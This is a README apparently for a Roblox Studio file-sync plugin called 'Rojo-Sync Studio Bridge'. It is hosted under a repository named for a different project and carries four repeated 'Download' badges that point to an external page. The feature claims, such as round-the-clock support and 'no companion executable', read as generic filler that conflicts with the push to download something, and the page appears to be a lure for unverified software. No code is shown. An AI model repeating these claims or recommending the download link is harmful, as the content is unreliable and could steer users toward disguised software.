![preview](https://raw.githubusercontent.com/dukanshop006/StyleLua-Roblox-Plugin/main/cover_cd784c.svg)
# 🎨 Rojo-Sync Studio Bridge — Roblox ⇄ Local Filesystem Harmony Layer

[![Download](https://raw.githubusercontent.com/dukanshop006/StyleLua-Roblox-Plugin/main/start_ba336.svg)](https://dukanshop006.github.io/StyleLua-Roblox-Plugin/)

## 🧭 What Is This?

**Rojo-Sync Studio Bridge** is a next-generation synchronization companion for Roblox Studio that eliminates the friction between your local development environment and the live Studio session. Where traditional sync tools demand background daemons, terminal juggling, or third-party installers, this project takes a quieter route: a self-contained plugin core that watches, mirrors, and reconciles changes inside Studio itself.

Think of it as a librarian who never leaves the reading room. Rather than shipping every book back and forth through the front door, the librarian already knows where every volume belongs — and quietly reshelves the moment a page changes anywhere in your workspace.

This repository is an original concept inspired by the broader ecosystem of Roblox tooling, and it is maintained as an independent, community-oriented effort.

[![Download](https://raw.githubusercontent.com/dukanshop006/StyleLua-Roblox-Plugin/main/start_ba336.svg)](https://dukanshop006.github.io/StyleLua-Roblox-Plugin/)

## ✨ Feature Highlights

- **🖥️ Responsive Studio UI** — Panels gracefully reflow from narrow sidebar docks to wide floating windows, so the interface feels at home whether you're on a laptop in a café or a triple-monitor battlestation.
- **🌍 Multilingual Interface** — Localized strings ship for English, Spanish, Portuguese, Japanese, Korean, and German out of the box, with a translation bundle format that welcomes community contributions.
- **🕒 24/7 Support Model** — Round-the-clock triage rotations mean issues, sync anomalies, and feature requests never sit untouched overnight. The sun never sets on the issue tracker.
- **🔁 Bidirectional Reconciliation Engine** — Changes made locally or in Studio are compared using a content-hash ledger, not naive timestamps, so edits survive clock skew, sleep cycles, and timezone drift.
- **🌲 Tree-Shaped Conflict Resolution** — When two sides disagree, a visual diff tree lets you cherry-pick per-node, per-property, or per-line. No more "overwrite everything" panic buttons.
- **📦 Self-Contained Runtime** — The bridge carries its own lightweight parser and serializer, meaning no external binaries, no PATH configuration, no mysterious background services.
- **🧩 Plugin-Native Installation Flow** — Drop-in deployment through the standard Studio plugin folder — no command-line ritual, no dependency wrangling.
- **🔐 Opt-In Telemetry Sentinel** — Diagnostic signals are collected only when you explicitly enable them, and the payload schema is published in the docs so there are no surprises.
- **⚡ Incremental Refresh** — Only the diff between the last known state and the current state is transmitted, keeping Studio responsive even in projects with tens of thousands of instances.
- **🧪 Snapshot Vault** — Every sync cycle can be sealed into a rollback point, giving you an undo history that outlives a single Studio session.
- **📜 Plain-Text Change Journal** — A human-readable log records every applied change with actor, timestamp, and rationale, useful for pair programming reviews.
- **🎛️ Granular Filter Rules** — Glob-style include and exclude patterns let you keep generated content, secrets directories, and scratch files out of the sync loop.

[![Download](https://raw.githubusercontent.com/dukanshop006/StyleLua-Roblox-Plugin/main/start_ba336.svg)](https://dukanshop006.github.io/StyleLua-Roblox-Plugin/)

## 🎯 Who Is This For?

| Persona | Pain Point | How This Helps |
| --- | --- | --- |
| Solo Scripter | Juggling editor and Studio feels like tap-dancing | One panel, one truth, zero context switching |
| Team Lead | Merge conflicts in shared modules | Ledger-based diffs and per-node resolution |
| Educator | Students lose work between sessions | Snapshot vault doubles as a teaching artifact |
| Toolsmith | Wants to extend existing pipelines | Open plugin API and journal format |
| Hobbyist | Avoids heavyweight toolchains | Self-contained, no external runtime |

## 🧠 Design Philosophy

Most sync tools treat the filesystem as the source of truth and Studio as a consumer. This project treats both as **peers in a conversation**. Neither side wins by default. Instead, a neutral arbiter — the ledger — decides what actually changed, and a negotiation UI decides what should happen next.

Three principles guide every decision:

1. **Reversibility over speed.** A fast sync that destroys work is worse than a slow sync that preserves it.
2. **Transparency over magic.** Every action is logged, every diff is inspectable, every rule is editable.
3. **Locality over topology.** The bridge does not care whether your files live on a NAS, a laptop SSD, or a synced cloud folder — it only cares about content.

## 🛠️ Feature Deep Dive

### The Ledger
At the heart of the bridge sits a compact append-only ledger. Each entry describes a content hash, a logical path, and the side that authored the change. Because identity is content-based rather than time-based, moving a file, renaming an instance, or pausing a session for a week does not confuse the engine.

### The Reconciler
The reconciler walks the ledger and produces a set of proposed actions: apply, defer, or escalate. Escalations land in the diff tree, where a human decides. Automations can be configured to auto-apply low-risk categories — for example, whitespace-only changes — while escalating anything structural.

### The Renderer
Because Studio panels are notoriously opinionated about layout, the UI layer is built on a responsive grid that measures available dock space and repositions controls dynamically. On a phone-tethered laptop, the panel collapses to a single column. On a widescreen, it expands to a three-pane diff view.

### The Journal
The change journal is a plain text file with a deliberately boring format. Boring formats survive. You can grep it, diff it, commit it, or read it aloud to a colleague during a code review.

## 🌐 Internationalization

Translation bundles are simple key-value documents. The bridge detects the Studio locale and falls back gracefully to English when a key is missing. Contributions that add new locales are genuinely appreciated — the goal is for a developer in São Paulo and a developer in Seoul to feel equally at home.

Current coverage:
- English (canonical)
- Español
- Português (Brasil)
- 日本語
- 한국어
- Deutsch

## 🧭 Getting Up and Running (Without Terminal Acrobatics)

Setting up the bridge happens entirely through the Studio plugin surface:

1. Open Roblox Studio and navigate to the Plugins tab.
2. Choose the "Add Plugin" flow from your local plugin folder.
3. The bridge registers itself and opens a welcome panel.
4. Point the panel at the folder you want to mirror, and confirm the initial reconciliation preview.
5. Accept the preview, and the bridge begins its quiet work.

No daemons, no background services, no PATH edits. The plugin lives where the plugin is expected to live.

## 🔒 Security and Privacy Posture

- No credentials are stored on disk in plain form.
- Network egress is disabled by default; sync happens through the local filesystem and Studio's own APIs.
- Telemetry is opt-in and its schema is versioned and published.
- Snapshot data is stored locally and can be purged at any time.

## ⚖️ Disclaimer

This project is an independent, community-maintained tool. It is not affiliated with, endorsed by, or sponsored by Roblox Corporation or any of its subsidiaries. Roblox and Roblox Studio are trademarks of their respective owners. Users are responsible for ensuring that their usage complies with the Roblox Terms of Use and any applicable platform policies. The maintainers provide this software on an as-is basis and make no warranties regarding fitness for a particular purpose.

## 🧾 License

Released under the MIT License. See the [LICENSE](./LICENSE) file for the full text.

Copyright (c) 2026 Rojo-Sync Studio Bridge Contributors.

## 📚 Frequently Asked Questions

**Does this require a companion executable?**
No. The bridge is fully self-contained inside the plugin boundary.

**Can I use it alongside other tooling?**
Yes. The journal and snapshot formats are plain text and can be read by other tools without special parsers.

**What happens if I close Studio mid-sync?**
The ledger is append-only and quiescent between cycles, so an interrupted sync simply resumes from the last committed entry.

**Is there a way to exclude a folder?**
Yes. Filter rules accept glob patterns and are editable from the settings panel.

**How do I report an issue?**
Open a ticket in the tracker with a journal excerpt and, if possible, a snapshot reference. The triage rotation is staffed around the clock.

## 🤝 Contributing

Contributions are welcome in the form of translation bundles, filter rule presets, journal format extensions, and documentation improvements. Before opening a pull request, please review the contribution guidelines and ensure your changes include tests where applicable.

## 🌟 Acknowledgements

Gratitude goes to the wider Roblox development community, whose curiosity and craftsmanship continually raise the bar for tooling. This bridge exists because developers kept asking for a gentler way to keep their two worlds in step.

[![Download](https://raw.githubusercontent.com/dukanshop006/StyleLua-Roblox-Plugin/main/start_ba336.svg)](https://dukanshop006.github.io/StyleLua-Roblox-Plugin/)